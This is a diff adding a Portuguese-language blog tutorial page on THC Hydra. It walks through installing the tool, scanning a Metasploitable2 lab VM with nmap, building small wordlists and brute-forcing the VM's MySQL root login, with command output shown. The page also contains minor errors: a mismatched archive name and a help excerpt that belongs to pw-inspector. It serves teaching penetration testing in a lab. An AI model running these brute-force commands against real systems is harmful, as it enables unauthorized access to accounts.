@@ -1,0 +1,399 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+	<!-- Meta -->
+	<meta charset="UTF-8"/>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+	<meta name="generator" content="Jekyll">
+
+	<title>Quebrando senhas com o THC Hydra</title>
+	<link rel="stylesheet"  href="/css/font-awesome/css/font-awesome.min.css">
+
+	<!-- CSS & fonts -->
+	<link rel="stylesheet" href="/css/main.css">
+	<link href="//fonts.googleapis.com/css?family=Suez+One|Ubuntu:300,400,500,700" rel="stylesheet" data-n-head="true">
+
+	<!-- RSS -->
+	<link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" />
+
+	<!-- Icons -->
+
+	<link rel="apple-touch-icon" sizes="57x57" href="/img/logo/apple-icon-57x57.png">
+	<link rel="apple-touch-icon" sizes="60x60" href="/img/logo/apple-icon-60x60.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="/img/logo/apple-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="76x76" href="/img/logo/apple-icon-76x76.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="/img/logo/apple-icon-114x114.png">
+	<link rel="apple-touch-icon" sizes="120x120" href="/img/logo/apple-icon-120x120.png">
+	<link rel="apple-touch-icon" sizes="144x144" href="/img/logo/apple-icon-144x144.png">
+	<link rel="apple-touch-icon" sizes="152x152" href="/img/logo/apple-icon-152x152.png">
+	<link rel="apple-touch-icon" sizes="180x180" href="/img/logo/apple-icon-180x180.png">
+	<link rel="icon" type="image/png" sizes="192x192"  href="/img/logo/android-icon-192x192.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="/img/logo/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="96x96" href="/img/logo/favicon-96x96.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="/img/logo/favicon-16x16.png">
+	<link rel="manifest" href="/img/logo/manifest.json">
+	<meta name="msapplication-TileColor" content="#ffffff">
+	<meta name="msapplication-TileImage" content="/img/logo/ms-icon-144x144.png">
+	<meta name="theme-color" content="#ffffff">
+</head>
+
+
+  <body>
+    <div id="wrap">
+        <!-- IF para definir o HEADER -->
+        
+          <header data-v-ae5c0adc="" class="header">
+   <a data-v-ae5c0adc="" href="/" class="header__back nuxt-link-active">
+      <svg data-v-ae5c0adc="" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left">
+         <line data-v-ae5c0adc="" x1="20" y1="12" x2="4" y2="12"></line>
+         <polyline data-v-ae5c0adc="" points="10 18 4 12 10 6"></polyline>
+      </svg>
+      <span>Ir para Home</span>
+   </a>
+   <div data-v-ae5c0adc="">
+      <nav role="navigation" class="navbar">
+         <ul role="menu" class="navbar__nav">
+            <li class="navbar__nav-item navbar__nav-item--search">
+               <div class="inner search__box">
+  <a href="#modal" role="link" class="navbar__nav-link">
+    <svg  xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="#ffffff">
+      <title class="search-icon">Search icon</title>
+      <path  fill-rule="evenodd" d="M15.7 13.3l-3.81-3.83A5.93 5.93 0 0 0 13 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 0 0 0-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z"></path>
+    </svg>
+  </a>
+</div>
+<div class="modal" id="modal">
+  <div class="search__box">
+    <a class="modal--close" href="#">&times;</a>
+      <svg data-v-38ac2332="" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="#404756" class="search__icon"><title data-v-38ac2332="" id="searchicon">Search icon</title><path data-v-38ac2332="" fill-rule="evenodd" d="M15.7 13.3l-3.81-3.83A5.93 5.93 0 0 0 13 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 0 0 0-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z"></path></svg>
+      <input type="text" id="search-input" class="search__input" placeholder="Digite algo..." autofocus>
+
+      <ul id="results-container"></ul>
+  </div>
+</div>
+<script src="js/simple-jekyll-search.min.js"></script>
+<script>
+SimpleJekyllSearch({
+  searchInput: document.getElementById('search-input'),
+  resultsContainer: document.getElementById('results-container'),
+  json: '/search.json'
+})
+</script>
+            </li>
+            <li data-v-2651ba95="" role="menuitem" class="navbar__nav-item">
+            	<a href="/" class="navbar__nav-link" title="Sobre" role="link">Home</a>
+            </li>
+            <li data-v-2651ba95="" role="menuitem" class="navbar__nav-item">
+               <a href="/projetos" class="navbar__nav-link" title="Sobre" role="link">Projetos</a>
+            </li>
+            <!-- FOR para gerar os intens do menu. -->
+            
+			    
+			 
+			    
+			    <li role="menuitem" class="navbar__nav-item">
+			    	<a role="link" class="navbar__nav-link" href="/about" title="Sobre">Sobre</a>
+			    </li>
+			    
+			 
+			    
+			 
+			    
+			 
+			    
+			 
+			    
+			 
+			    
+			 
+			    
+			 
+			    
+			 
+         </ul>
+      </nav>
+      <!---->
+   </div>
+</header>
+
+
+
+<header id="header" class="pageHeader pageHeader--background">
+	<article itemscope="itemscope" itemtype="http://schema.org/NewsArticle" class="article">
+		<figure itemprop="image" itemscope="itemscope" itemtype="http://schema.org/ImageObject" class="pageHeader__image">
+			<meta itemprop="url" content="img\posts\2017-08-15-quebrando-senhas-com-o-thc-hydra\header.jpg">
+			<img src="img\posts\2017-08-15-quebrando-senhas-com-o-thc-hydra\header.jpg" alt="Quebrando senhas com o THC Hydra" />
+		</figure>
+		<div class="info-header">
+			<h1 class="pageHeader__title">Quebrando senhas com o THC Hydra</h1>
+			<ol itemscope="itemscope" itemtype="http://schema.org/BreadcrumbList" class="breadcrumb">
+				<li itemprop="itemListElement" itemscope="itemscope" itemtype="http://schema.org/ListItem" class="breadcrumb__item">
+					<a  href="/" class="breadcrumb__link nuxt-link-active" title="Home" itemprop="item">
+						<span itemprop="name">Home</span>
+						<meta  itemprop="position" content="1">
+					</a>
+					<span class="breadcrumb__divider">»</span>
+				</li>
+				
+				<li itemprop="itemListElement" itemscope="itemscope" itemtype="http://schema.org/ListItem" class="breadcrumb__item">
+					<a class="breadcrumb__link nuxt-link-exact-active nuxt-link-active breadcrumb__link--active" title="Quebrando senhas com o THC Hydra" itemprop="item" href="/quebrando-senhas-com-o-thc-hydra">
+					<span itemprop="name">Quebrando senhas com o THC Hydra</span>
+					<meta itemprop="position" content="2">
+					</a>
+				</li>
+
+			</ol>
+			<p itemprop="description" class="pageHeader__description">Um pouco de como ando utilizando o BeatifulSoup no meu dia-a-dia!</p>
+			<div data-v-669fd401="" class="pageHeader__meta">
+
+				<span data-v-669fd401="">Publicado em Agosto de 2017, por <span data-v-669fd401="" itemprop="author">Andrey Glauzer</span>
+			</div>
+		</div>
+	</span>
+</header>
+
+        
+
+        <!-- Main content -->
+    	  <div class="container">
+          <div class="grid grid--1of2">
+        			<article id="post-page">
+	<div class="content">
+		<h2 id="thc-hydra">THC Hydra</h2>
+
+<p>Vou falar hoje sobre uma ferramenta que também é muito utilizada para realização de auditoriais em pentest que é o <code class="highlighter-rouge">THC – Hydra</code> que tem como objetivo realizar ataques de <code class="highlighter-rouge">força bruta</code> ou como muitos falam <code class="highlighter-rouge">brute force</code>, ou seja, ele faz diversas tentativas de acesso com a utilização de <code class="highlighter-rouge">wordlist</code>, até conseguir acesso.</p>
+
+<p><img src="img/posts/2017-08-15-quebrando-senhas-com-o-thc-hydra/xhydra.png" alt="imagem hydra" /></p>
+
+<h2 id="o-que-o-thc-hydra-suporta">O que o THC Hydra suporta</h2>
+
+<p>Atualmente o <code class="highlighter-rouge">THC – Hydra</code>, suporta os serviços:</p>
+
+<p>AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET,
+HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY, HTTPS-FORM-GET,
+HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP,
+MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere,
+PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, SAP/R3, SIP, SMB, SMTP,
+SMTP Enum, SNMP, SOCKS5, SSH (v1 and v2), Subversion, Teamspeak (TS2),
+Telnet, VMware-Auth, VNC and XMPP.</p>
+
+<h2 id="instalando-o-hydra-no-linux">Instalando o Hydra no Linux</h2>
+
+<p>Para quem usa Kali Linux, ele ejá vem instalado, mas para quem usar outras distribuições assim como eu, é só seguir os passos abaixo:</p>
+
+<p>Primeiro será necessário baixar os arquivos e descompactá-los.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">wget www.thc.org/releases/hydra-8.1.tar.gz
+<span class="nb">tar </span>vzxf hydra-7.1-src.tar.gz
+<span class="nb">cd </span>hydra-8.1</code></pre></figure>
+
+<h4 id="configurações-opcionais">Configurações opcionais</h4>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nt">--disable-xhydra</span> <span class="c"># não compila o xhydra (hydra GUI)</span>
+<span class="nt">--prefix</span><span class="o">=</span>/opt/hydra <span class="c"># diz onde vai ser instalado o hydra.</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">./configure <span class="nt">--disable-xhydra</span> <span class="nt">--prefix</span><span class="o">=</span>/opt/hydra</code></pre></figure>
+
+<p>compila, instala e cria link simbólico:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">make <span class="o">&amp;&amp;</span> make install <span class="o">&amp;&amp;</span> ln <span class="nt">-s</span> /opt/hydra/hydra /usr/bin</code></pre></figure>
+
+<p>Caso queira usar o pw-inspector criar um link simbólico pra ele também:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ln <span class="nt">-s</span> /opt/hydra/pw-inspector /usr/bin</code></pre></figure>
+
+<h2 id="metasploitable2-e-reconhecimento">Metasploitable2 e reconhecimento</h2>
+
+<p>Para que possamos realizar o teste nesse artigo, vou utilizar uma máquina virtual que tem diversas vulnerabilidades justamente para realizar testes de invasão, <a href="https://sourceforge.net/projects/metasploitable/files/Metasploitable2/" class="link-exteno">Metasploitable2</a>, caso queria saber mais sobre essa máquina virtual, é só <a href="https://sourceforge.net/p/metasploitable/wiki/Home/" class="link-exteno">acessar o seu WIKI</a>.</p>
+
+<p>A instalação dessa máquina virtual não é difícil, você só precisa de um software de virtualização, eu uso o <code class="highlighter-rouge">Virtual Box</code>, que a sua licença é <code class="highlighter-rouge">free</code>. Existe esse <a href="http://resources.infosecinstitute.com/running-metasploitable2-on-virtualbox/" class="link-exteno">Tutorial AQUI</a>, que explica como usar o <code class="highlighter-rouge">Metasploitable2</code> no virtual box, se você seguir o tutorial certinho, nada vai dar errado.</p>
+
+<h3 id="usando-nmap-para-reconhecimento">Usando Nmap para reconhecimento</h3>
+
+<p>Após a instalação dessa minha máquina virtual, será necessário descobrir quais os serviços que estão abertos nela para que possamos pegar um que esteja com o status de <code class="highlighter-rouge">open</code>, então para isso vou utilizar o <code class="highlighter-rouge">nmap</code>, vou filtrar somente algumas portas.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nmap <span class="nt">-sS</span> 192.168.1.40 <span class="nt">-p</span> <span class="o">[</span>80,22,3306]</code></pre></figure>
+
+<p>Lembrando o IP <code class="highlighter-rouge">192.168.1.40</code> é minha máquina virtual. Resultado:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Nmap scan report <span class="k">for </span>new-host.home <span class="o">(</span>192.168.1.40<span class="o">)</span>
+Host is up <span class="o">(</span>0.00057s latency<span class="o">)</span><span class="nb">.</span>
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+3306/tcp open  mysql
+MAC Address: 08:00:27:40:36:A7 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>1.58 second</code></pre></figure>
+
+<p>Perfeito sabemos que os serviços de <code class="highlighter-rouge">SSH, HTTP e MYSQL</code>, estão com o status de open, vou tentar quebrar a senha do <code class="highlighter-rouge">mysql</code>.</p>
+
+<h2 id="entendendo-como-o-hydra-funciona">Entendendo como o Hydra funciona</h2>
+
+<p>Já que descobrimos que o serviço de <code class="highlighter-rouge">mysql</code> está com o status de open, vamos descobrir qual o usuário e a senha do mysql, para que possamos fazer vamos utilizar o hydra.</p>
+
+<p>Antes de realizarmos qualquer teste, vamos dar uma olhada no help então execute aí <code class="highlighter-rouge">hydra -help</code>.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">  <span class="nt">-i</span> FILE nome da wordlist pra ser tratada <span class="o">(</span>default: stdin<span class="o">)</span><span class="nb">.</span>
+  <span class="nt">-o</span> FILE nome para o arquivo saída com o conteúdo já tratado <span class="o">(</span>default: stdout<span class="o">)</span><span class="nb">.</span>
+  <span class="nt">-m</span> Tamanho minimo da senha.
+  <span class="nt">-M</span> Tamanho máximo da senha.
+  <span class="nt">-c</span> MINISETS número minimo de sets necessários.
+
+Sets:
+     <span class="nt">-l</span> Caracteres minúsculos <span class="o">(</span>a,b,c,d, etc.<span class="o">)</span>
+     <span class="nt">-u</span> Caracteres maiúsculos <span class="o">(</span>A,B,C,D, etc.<span class="o">)</span>
+     <span class="nt">-n</span> Números  <span class="o">(</span>1,2,3,4, etc.<span class="o">)</span>
+     <span class="nt">-p</span> Aqui são os caracteres que não se encaixam <span class="nt">-l</span>/-u/-n em são eles <span class="nv">$,</span><span class="o">!</span>,/,<span class="o">(</span>,, etc.<span class="o">)</span>
+     <span class="nt">-s</span> Caracteres especiais - são todos que não encaixam em nenhum dos sets acima.
+     <span class="nt">-t</span> Limita o número de conexões paralelas <span class="o">(</span>default: 16<span class="o">)</span>.</code></pre></figure>
+
+<p>Essas são as opções que vamos utilizar aqui, existem outras, caso fique curioso é só ler o restante das opções, o help todo está em inglês essa é uma tradução feila pelo <code class="highlighter-rouge">MDH3LL</code>.</p>
+
+<h3 id="wordlists">Wordlists</h3>
+
+<p>Após conhecermos as opções que vamos utilizar então é só partimos para ação. Primeiro precisamos de uma <code class="highlighter-rouge">wordlist</code>, então vamos fazer uma, não precisa ser algo muito complexo vamos criar uma com poucas informações mesmo, é claro que se você tiver uma com mais opções e maior será bem mais eficiente, mas se não tiver então acesse o seu terminal e digite:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">touch user.list
+vim user.list</code></pre></figure>
+
+<p>Aperte a tecla <code class="highlighter-rouge">i</code> copie e cole os users abaixo:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">root
+teste
+admin
+user
+ROOT
+RooT
+User
+Admin</code></pre></figure>
+
+<p>Aperte <code class="highlighter-rouge">esc</code> e digite <code class="highlighter-rouge">:wq</code></p>
+
+<p>para fazer a <code class="highlighter-rouge">wordlist</code> de senhas:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">touch password.list
+vim password.list</code></pre></figure>
+
+<p>Copie e cole as mesmas informações da lista <code class="highlighter-rouge">user</code>. Com as wordlist prontas agora vamos tentar quebrar a senha do mysql <code class="highlighter-rouge">Lol</code>. Para isso acesse o seu terminal e digite:</p>
+
+<h3 id="quebrando-senhas-com-o-thc-hydra">Quebrando senhas com o THC Hydra.</h3>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">hydra <span class="nt">-L</span> user.list <span class="nt">-P</span> password.list <span class="nt">-t</span> 1 192.168.1.40 mysql</code></pre></figure>
+
+<p>Resultado:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Hydra v8.1 <span class="o">(</span>c<span class="o">)</span> 2014 by van Hauser/THC - Please <span class="k">do </span>not use <span class="k">in </span>military or secret service organizations, or <span class="k">for </span>illegal purposes.
+
+Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> starting at 2016-04-21 13:31:16
+<span class="o">[</span>WARNING] Restorefile <span class="o">(</span>./hydra.restore<span class="o">)</span> from a previous session found, to prevent overwriting, you have 10 seconds to abort...
+<span class="o">[</span>DATA] max 1 task per 1 server, overall 64 tasks, 28472 login tries <span class="o">(</span>l:8/p:3559<span class="o">)</span>, ~444 tries per task
+<span class="o">[</span>DATA] attacking service mysql on port 3306
+<span class="o">[</span>3306][mysql] host: 192.168.1.40   login: <span class="s2">"root"</span>  - pass <span class="s2">""</span> - 35 of 3559 <span class="o">[</span>child 0]</code></pre></figure>
+
+<p>Como é possível ver no nosso resultado temos acesso ao <code class="highlighter-rouge">mysql</code> o usuário <code class="highlighter-rouge">root</code> e com nenhuma senha. Então vamos alterar a senha do <code class="highlighter-rouge">mysql</code> para uma palavra que colocamos na nossa wordlist, aqui vou usar a senha <code class="highlighter-rouge">admin</code>. Para alterar a senha do mysql vá ate a sua máquina virtual e digite:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">mysqladmin <span class="nt">-u</span> root password <span class="s1">'admin'</span></code></pre></figure>
+
+<p>Se realizarmos o teste novamente</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Hydra v8.1 <span class="o">(</span>c<span class="o">)</span> 2014 by van Hauser/THC - Please <span class="k">do </span>not use <span class="k">in </span>military or secret service organizations, or <span class="k">for </span>illegal purposes.
+
+Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> starting at 2016-04-21 13:55:27
+<span class="o">[</span>WARNING] Restorefile <span class="o">(</span>./hydra.restore<span class="o">)</span> from a previous session found, to prevent overwriting, you have 10 seconds to abort...
+<span class="o">[</span>DATA] max 1 task per 1 server, overall 64 tasks, 28472 login tries <span class="o">(</span>l:8/p:3559<span class="o">)</span>, ~444 tries per task
+<span class="o">[</span>DATA] attacking service mysql on port 3306
+<span class="o">[</span>3306][mysql] host: 192.168.1.40   login: <span class="s2">"root"</span>  - pass <span class="s2">"admin"</span> - 35 of 3559 <span class="o">[</span>child 0]</code></pre></figure>
+
+<p>Bom à principio é apenas isso, você também pode fazer testes como esses em páginas de login, é só uma questão de ler com atenção as opções que exitem no help, com certeza você vai conseguir fazer outros testes bem mais interessantes que esse.</p>
+
+<h3 id="referências">Referências</h3>
+
+<p><a href="https://ghostbin.com/paste/y92ha" class="link-exteno">THC-HYDRA [PT-BR] ver 2.1 (Rev)</a></p>
+
+<p><a href="https://www.thc.org/thc-hydra/" class="link-exteno">thc.org</a></p>
+
+<hr />
+<p>Viu algum erro ou gostaria de adicionar alguma sugestão a essa matéria? Comente.</p>
+
+		<div id="coment" class="comments">
+	<div class="content-coment">
+		<h3 data-v-dd8644c2="">Comentários para: <span class="opacity">"Quebrando senhas com o THC Hydra"</span></h3>
+		<div id="disqus_thread"></div>
+		<script>
+
+		/**
+		 *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+		 *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables */
+		/*
+		var disqus_config = function () {
+		    this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+		    this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+		};
+		*/
+		(function() { // DON'T EDIT BELOW THIS LINE
+		    var d = document, s = d.createElement('script');
+		    s.src = '//andreyglauzer-1.disqus.com/embed.js';
+		    s.setAttribute('data-timestamp', +new Date());
+		    (d.head || d.body).appendChild(s);
+		})();
+		</script>
+		<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                                    
+	</div>
+</div>
+
+<style type="text/css">
+
+.comments{
+    background-color: #fff;
+    border-top: 1.12px solid rgba(64,71,86,.1);
+    border-top: .07rem solid rgba(64,71,86,.1);
+    padding: 30px 0 0;
+    padding: 1.875rem 0 0;
+    margin-top: 30px;
+    margin-top: 1.875rem;
+
+div.alinhamento-header-posts{
+    padding-top: 3rem;
+}
+
+div#coment{
+    background-color: #fff;
+    padding: 30px 0;
+    margin-top: 15px;
+}
+div.content-coment h3 span.opacity{
+        opacity: .6;
+    font-weight: 500;
+}
+div.content-coment{
+    max-width: 768px;
+    max-width: 48rem;
+    display: block;
+    margin:0 auto;
+}
+</style>
+	</div>
+</article>
+
+
+          </div>
+    		
+    		  <!-- Definicação de paginação -->
+          
+
+    	  </div>
+    	    
+    	    <!-- Footer -->
+    	    <footer>
+	Made with ♥ by <a target="_blank" href="https:/github.com/andreyglauzer/">Andrey Glauzer</a>, using <a href="">Jekyll</a>. This is an open <a target="_blank" href="https:/github.com/andreyglauzer/andreyglauzer.github.io/">source code</a>. Version 1.1.0.
+</footer>
+
+    	    <!-- Script -->
+          <script src="/js/main.js"></script>	
+
+  	</div>
+  </body>
+</html>
